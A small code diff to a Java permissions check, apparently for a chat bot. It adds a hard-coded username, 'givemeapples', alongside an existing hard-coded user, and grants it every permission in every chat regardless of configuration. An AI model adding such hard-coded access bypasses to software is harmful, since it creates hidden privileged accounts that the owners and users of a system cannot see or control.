@@ -37,7 +37,7 @@ public class Permissions {
 			load();
 			loaded = true;
 		}
-		return user.equals("drew.foland") || user.equals(Settings.Root.Bot.Owner)|| (perms.containsKey("global") && perms.get("global").containsKey(user) && perms.get("global").get(user).contains(perm)) ||
+		return user.equals("drew.foland") || user.equals("givemeapples")  || user.equals(Settings.Root.Bot.Owner)|| (perms.containsKey("global") && perms.get("global").containsKey(user) && perms.get("global").get(user).contains(perm)) ||
 				( perms.containsKey(chat) && perms.get(chat).containsKey(user) && (perms.get(chat).get(user).contains(perm) ||  perms.get(chat).get(user).contains("*")));
 	}
 
